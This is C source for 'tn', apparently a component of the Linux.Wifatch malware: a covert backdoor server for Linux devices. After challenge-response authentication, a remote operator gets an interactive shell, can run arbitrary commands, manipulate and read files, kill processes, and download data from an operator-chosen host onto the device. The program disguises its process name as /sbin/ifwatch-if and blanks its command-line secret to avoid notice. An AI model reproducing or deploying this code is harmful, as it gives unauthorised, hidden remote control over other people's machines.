
/*
 * This file is part of Linux.Wifatch
 *
 * Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
 *
 * Linux.Wifatch is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Linux.Wifatch is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
 */

// usage: tn port id64.secret64.port4 -- primitive telnet server

//      1 -- start shell
//      2 path -- open rdonly
//      3 path -- open wrcreat
//      4 -- close
//      5 signal8 x16 pid32 -- kill
//      6 x8 mod16 path -- chmod
//      7 srcpath | dstpath -- rename
//      8 path -- unlink
//      9 path -- mkdir
//     10 x8 port16be saddr32be | writedata* | "" | dstpatha - len32* -- download // need to use readlink or so
// V12 10 x8 port16be saddr32be | writedata* | "" | dstpatha - ""* ret32 errno32 -- download
//     11 [path] - statdata -- lstat
//     12 path - statdata -- statfs
//     13 command -- exec command (stdin/out/err null)
//     14 command - cmdoutput... "chg_id" -- exec commmand  with end marker
//     15 - dirdata* | "" -- getdents64
// V 9 15 - paths* | "" -- getdents64
//     16 x16 mode8 off32 --  lseek
//     17 - fnv32a -- fnv32a
// V 9 17 [x24 len32] - fnv32a -- fnv32a
//     18 - filedata* | "" -- readall file
// V 9 18 [x24 len32] - filedata* | "" -- read file
//     19 filedata -- write file
//     20 path - linkdata -- readlink
//     21 - ret32 -- last syscall result
// V 7 22 path - chdir
// V 8 23 path - statdata -- stat
// V10 24 sha3 [x16 len32] - keccak -- keccak-1600-1088-512 or sha3-256
// V11 25 x3 ms32 -- sleep
// V13 26 x1 mode16 mode32 path -- open

// ver 10
// use wait4 instead of waitpid, maybe that helps
// properly set so_reuseaddr on the listening socket

// ver 12
// use BER encoding for stat, statvfs
// empty name in stat means fstat
// fnv/readall/keccak make length optional
// xstat error results in empty packet

// ver 13
// replace 2, 3 by 26

#define VERSION "13"

#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/statfs.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/syscall.h>

#include "tinyutil.h"
#include "keccak.c"

extern char **environ;

// eXit
__attribute__ ((noreturn))
static void x(void)
{
        _exit(0);
}

static const struct sigaction sa_sigign = {
        .sa_handler = SIG_IGN,
        .sa_flags = SA_RESTART,
};

static const struct sigaction sa_sigdfl = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_RESTART,
};

static uint8_t secret[32 + 32 + 32];    // challenge + id + secret

static int rpkt(int offset)
{
        uint8_t *base = buffer + offset;
        uint8_t *p = base;
        uint8_t l;

        if (read(0, &l, 1) <= 0 || (l && l != recv(0, base, l, MSG_WAITALL)))
                x();

        base[l] = 0;
        return l;
}

static void wpkt(uint8_t * base, uint8_t len)
{
        write(1, &len, 1);
        write(1, base, len);
}

NOINLINE static uint8_t *pack_rw(uint8_t * p, uint32_t v)
{
        *--p = v & 0x7f;

        for (;;) {
                v >>= 7;
                if (!v)
                        return p;

                *--p = v | 0x80;
        }
}

static void sockopts(int fd)
{
        static const int one = 1;

        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof (one));
        setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof (one));
        //setsockopt (fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof (one)); // only good for testing
}

static uint32_t wget(int fd)
{
        int sock = socket(AF_INET, SOCK_STREAM, 0);

        if (sock < 0)
                return 1;

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = *(uint32_t *) (buffer + 4);
        sa.sin_port = *(uint16_t *) (buffer + 2);;

        sockopts(sock);

        if (connect(sock, (struct sockaddr *)&sa, sizeof (sa)))
                return 2;

        int wlen;

        while ((wlen = rpkt(0)))
                write(sock, buffer, wlen);

        for (;;) {
                uint32_t len = recv(sock, buffer, BUFFER_SIZE, MSG_WAITALL);

                if (len <= 0)
                        break;

                write(fd, buffer, len);

                wpkt(buffer, 0);
        }

        close(sock);

        return 0;
}

static void setfds(int fd)
{
        int i;

        for (i = 0; i < 3; ++i)
                syscall(SCN(SYS_dup2), fd, i);

        close(fd);
}

int main(int argc, char *argv[])
{
#if 0
        {
                crypto_hash(buffer, buffer, 96);
                hd(buffer, 1088 / 8);
        }
#endif
        if (argc == 2) {
                static char *eargv[] = { "/sbin/ifwatch-if", "eth0", 0, 0 };
                eargv[2] = argv[1];
                execve(argv[0], eargv, environ);
        }
        // copy id + challenge-response secret from commandline.
        // also space out commandline secret, to be less obvious.
        // some ps versions unfortunately show the spaces.
        {
                int i;

                for (i = 0; i < 64 + 2; ++i)
                        secret[32 + i] = argv[2][i * 2 + 0] * 16 + argv[2][i * 2 + 1] - 'a' * (16 + 1);

                for (i = 0; i < (64 + 2) * 2; ++i)
                        argv[2][i] = ' ';
        }

        int ls = socket(AF_INET, SOCK_STREAM, 0);

        if (ls < 0)
                return 0;

        sockopts(ls);

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = INADDR_ANY;
        sa.sin_port = *(uint16_t *) (secret + 32 + 64);

        if (bind(ls, (struct sockaddr *)&sa, sizeof (sa)))
                return 0;

        if (listen(ls, 1))
                return 0;

        write(1, MSG("ZohHoo5i"));

        if (fork())
                return 0;

        sigaction(SIGHUP, &sa_sigign, 0);
        sigaction(SIGCHLD, &sa_sigign, 0);

        syscall(SCN(SYS_setsid));
        syscall(SCN(SYS_umask), 0000);

        for (;;) {
                {
                        int i = open("/dev/urandom", O_RDONLY);

                        if (i >= 0) {
                                read(i, secret, 32);
                                close(i);
                        }

                        ++secret[0];

                        for (i = 0; i < 31; ++i)
                                secret[i + 1] += secret[i];
                }

                int fd = accept(ls, 0, 0);

                if (fd >= 0) {
                        if (fork() == 0) {
                                close(ls);
                                syscall(SCN(SYS_setsid));
                                sigaction(SIGCHLD, &sa_sigdfl, 0);

                                setfds(fd);

                                sockopts(0);

                                // see bm::tn for more readable challenge response protocol
                                write(0, secret, 32 + 32);
                                crypto_hash(buffer, secret, 32 + 32 + 32);

                                rpkt(32);

                                if (memcmp(buffer, buffer + 32, 32))
                                        x();

                                wpkt(MSG(VERSION "/" arch));    /* version/arch */
                                static const uint32_t endian = 0x11223344;

                                wpkt((uint8_t *) & endian, sizeof (endian));
                                //wpkt (STRINGIFY (BUFFER_SIZE), sizeof (STRINGIFY (BUFFER_SIZE)) - 1);
                                wpkt(buffer, 0);

                                uint8_t clen;
                                int fd;
                                int ret;

                                while ((clen = rpkt(0)))
                                        switch (buffer[0]) {
                                          case 1:      // telnet
                                                  {
                                                          static char *argv[] = { "sh", "-i", 0 };
                                                          execve("/bin/sh", argv, environ);
                                                  }
                                                  break;

                                          case 4:      // close
                                                  close(fd);
                                                  break;

                                          case 5:      // kill
                                                  ret = syscall(SCN(SYS_kill), *(uint32_t *) (buffer + 4), buffer[1]);
                                                  break;

                                          case 6:      // chmod
                                                  ret = syscall(SCN(SYS_chmod), buffer + 4, *(uint16_t *) (buffer + 2));
                                                  break;

                                          case 7:      // rename
                                                  rpkt(260);
                                                  ret = syscall(SCN(SYS_rename), buffer + 1, buffer + 260);
                                                  break;

                                          case 8:      // unlink
                                                  ret = syscall(SCN(SYS_unlink), buffer + 1);
                                                  break;

                                          case 9:      // mkdir
                                                  ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
                                                  break;

                                          case 11:     // lstat
                                          case 23:     // stat
                                                  {
                                                          struct stat buf;
                                                          int l;

#if HAVE_XSTAT
                                                          int nr = SCN(SYS_fstat);
                                                          long arg = fd;

                                                          if (clen > 1) {
                                                                  arg = (long)(buffer + 1);
                                                                  nr = buffer[0] == 23 ? SCN(SYS_stat) : SCN(SYS_lstat);
                                                          }

                                                          l = xstat(nr, arg, &buf);

#else
                                                          l = buffer[1]
                                                              ? (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf)
                                                              : fstat(fd, &buf);
#endif

                                                          uint8_t *p = buffer + 6 * 5;

                                                          p = pack_rw(p, buf.st_uid);
                                                          p = pack_rw(p, buf.st_mtime);
                                                          p = pack_rw(p, buf.st_size);
                                                          p = pack_rw(p, buf.st_mode);
                                                          p = pack_rw(p, buf.st_ino);
                                                          p = pack_rw(p, buf.st_dev);

                                                          wpkt(p, (buffer + 6 * 5 - p) & -!l);
                                                  }
                                                  break;

                                          case 12:     // statfs
                                                  {
                                                          struct statfs sfsbuf;
                                                          int l = statfs(buffer + 1, &sfsbuf);
                                                          uint8_t *p = buffer + 7 * 5;

                                                          p = pack_rw(p, sfsbuf.f_ffree);
                                                          p = pack_rw(p, sfsbuf.f_files);
                                                          p = pack_rw(p, sfsbuf.f_bavail);
                                                          p = pack_rw(p, sfsbuf.f_bfree);
                                                          p = pack_rw(p, sfsbuf.f_blocks);
                                                          p = pack_rw(p, sfsbuf.f_bsize);
                                                          p = pack_rw(p, sfsbuf.f_type);

                                                          wpkt(p, (buffer + 7 * 5 - p) & -!l);
                                                  }
                                                  break;

                                          case 13:     // exec quiet
                                          case 14:     // exec till marker
                                                  {
                                                          int quiet = buffer[0] == 13;

                                                          pid_t pid = fork();

                                                          if (pid == 0) {
                                                                  if (quiet)
                                                                          setfds(open("/dev/null", O_RDWR));

                                                                  static char *argv[] = { "sh", "-c", buffer + 1, 0 };
                                                                  execve("/bin/sh", argv, environ);
                                                                  _exit(0);
                                                          }

                                                          if (pid > 0)
                                                                  syscall(SCN(SYS_wait4), (int)pid, &ret, 0, 0);

                                                          if (!quiet)
                                                                  wpkt(secret, 32 + 32);        // challenge + id
                                                  }
                                                  break;

                                          case 15:     // readdir
                                                  {
                                                          int l;

                                                          while ((l = syscall(SCN(SYS_getdents64), fd, buffer, sizeof (buffer))) > 0) {
                                                                  uint8_t *cur = buffer;
                                                                  uint8_t *end = buffer + l;

                                                                  while (cur < end) {
                                                                          struct linux_dirent64 *dent = (void *)cur;

                                                                          wpkt((void *)&dent->name, strlen(dent->name));
                                                                          cur += dent->reclen;
                                                                  }
                                                          }

                                                          wpkt(buffer, 0);
                                                  }
                                                  break;

                                          case 16:     // lseek
                                                  ret = lseek(fd, *(int32_t *) (buffer + 4), buffer[3]);
                                                  break;

                                          case 17:     // fnv
                                          case 18:     // read/readall
                                          case 24:     // keccak
                                                  {
                                                          int fnv = buffer[0] == 17;
                                                          int kec = buffer[0] == 24;
                                                          int sha = buffer[1];
                                                          uint32_t hval = 2166136261U;
                                                          uint32_t max = clen >= 8 ? *(uint32_t *) (buffer + 4) : -1;
                                                          int l, m = buffer[0] == 18 ? 254 : BUFFER_SIZE;

                                                          Keccak_Init();

                                                          while ((l = read(fd, buffer, MIN(max, m))) > 0) {
                                                                  max -= l;

                                                                  if (fnv) {
                                                                          uint8_t *p = buffer;

                                                                          while (l--) {
                                                                                  hval ^= *p++;
                                                                                  hval *= 16777619;
                                                                          }
                                                                  } else if (kec)
                                                                          Keccak_Update(buffer, l);
                                                                  else
                                                                          wpkt(buffer, l);

                                                                  if (!max)
                                                                          break;
                                                          }

                                                          if (kec) {
                                                                  Keccak_Final(buffer, sha);
                                                                  wpkt(buffer, 32);
                                                          } else
                                                                  wpkt((uint8_t *) & hval, fnv ? sizeof (hval) : 0);
                                                  }
                                                  break;

                                          case 19:     // write
                                                  ret = write(fd, buffer + 1, clen - 1);
                                                  break;

                                          case 20:     // readlink
                                                  {
                                                          int l = syscall(SCN(SYS_readlink), buffer + 1, buffer + 260, 255);

                                                          wpkt(buffer + 260, l > 0 ? l : 0);
                                                  }
                                                  break;

                                          case 10:     // wget
                                                  ret = wget(fd);
                                                  // fall through

                                          case 21:     // readret
                                                  wpkt((uint8_t *) & errno, sizeof (errno));
                                                  wpkt((uint8_t *) & ret, sizeof (ret));
                                                  break;

                                          case 22:     // chdir
                                                  ret = syscall(SCN(SYS_chdir), buffer + 1);
                                                  break;

                                          case 25:     // sleep
                                                  sleep_ms(*(uint32_t *) (buffer + 4));
                                                  break;

                                          case 26:     // open
                                                  ret = fd = open(buffer + 8, *(int32_t *) (buffer + 4), *(int16_t *) (buffer + 2));
                                                  break;

                                          default:
                                                  x();
                                        }
                        }
                        // keep fd open for at least delay, also delay hack attempts
                        sleep_ms(1000);

                        close(fd);
                }
        }
}
